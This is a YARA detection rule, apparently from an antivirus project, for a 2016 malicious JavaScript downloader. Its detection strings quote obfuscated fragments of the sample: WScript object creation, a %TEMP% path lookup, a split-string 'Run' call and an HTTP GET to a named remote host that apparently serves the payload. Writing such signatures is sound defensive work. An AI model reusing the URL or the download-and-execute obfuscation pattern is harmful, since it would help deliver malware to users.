rule sig_20160428_d46529ab5ce93590199e4396f931257b {
  meta:
    description = "datamaliciousorder - file 20160428_d46529ab5ce93590199e4396f931257b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f86cb36e11676d75e66714eaa8eec61b7f32a206dd588902fb443ecd92a45ff3"

  strings:
    $s1  = "function FutSxwAzpRppSmkLtdVkl(ZrnUnoYgcCdsTftEdbOei){HxsSxwXzrZntEcsOxpCfj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function EssHypJfgGfiYeePzrLuu() {return HxsSxwXzrZntEcsOxpCfj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function FutSxwAzpRppSmkLtdVkl(ZrnUnoYgcCdsTftEdbOei){HxsSxwXzrZntEcsOxpCfj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return QrnNmoXorCixFzkGzcOou - NjcBzdBrlGpeDumLhfWbu;};" fullword ascii
    $s5  = "function GtaRdzWheZkjTxjTddLdy(QrnNmoXorCixFzkGzcOou, NjcBzdBrlGpeDumLhfWbu){XgfOgfWmdWdrEhbUfzDau = XgfOgfWmdWdrEhbUfzDau * 1; " ascii
    $s6  = "var HxsSxwXzrZntEcsOxpCfj = function IwvRtrDzrErnJmdOxdEuh() {return TpyWfvDzbDmnNwxCmcLxi[AevJutRgrPmqHlfLydApx](\"WScript\"+\"" ascii
    $s7  = "FytQobKbfAlzXhzKbdEzj[KrlMbmMlbYewZchVolUlx](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s8  = "var HxsSxwXzrZntEcsOxpCfj = function IwvRtrDzrErnJmdOxdEuh() {return TpyWfvDzbDmnNwxCmcLxi[AevJutRgrPmqHlfLydApx](\"WScript\"+\"" ascii
    $s9  = "var TpyWfvDzbDmnNwxCmcLxi = this[\"WScript\"];" fullword ascii
    $s10 = "function EssHypJfgGfiYeePzrLuu() {return HxsSxwXzrZntEcsOxpCfj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function GtaRdzWheZkjTxjTddLdy(QrnNmoXorCixFzkGzcOou, NjcBzdBrlGpeDumLhfWbu){XgfOgfWmdWdrEhbUfzDau = XgfOgfWmdWdrEhbUfzDau * 1; " ascii
    $s12 = "if (FytQobKbfAlzXhzKbdEzj[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function JkuEzyNnpYgeUqbGjnYzm(){return NtxYhxGtfJlsHlsKdlFpg + \"\";};" fullword ascii
    $s14 = "function UczVbbLuoHvdClwZzxSmd() {return ((AllDgaXpcZedFyjReiPby == true) && (AllDgaXpcZedFyjReiPby == UrnPmjGhrNbxVedTijEgd)) ?" ascii
    $s15 = "function UczVbbLuoHvdClwZzxSmd() {return ((AllDgaXpcZedFyjReiPby == true) && (AllDgaXpcZedFyjReiPby == UrnPmjGhrNbxVedTijEgd)) ?" ascii
    $s16 = "function LvjXhvHmiMtsYjeEaiJtk(OgcFtwGckIloVpiZcwNgt) {var PlkKmlLuhKshEnkAgwEqv = (1, 2, 3, 4, 5, OgcFtwGckIloVpiZcwNgt); retur" ascii
    $s17 = "var AllDgaXpcZedFyjReiPby = false;" fullword ascii
    $s18 = "function BepEazKegLhiIxfNsmWzw(){return 23;};" fullword ascii
    $s19 = "}while (DxhErtOugXmiLolEgvZlf);" fullword ascii
    $s20 = "var UrnPmjGhrNbxVedTijEgd = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}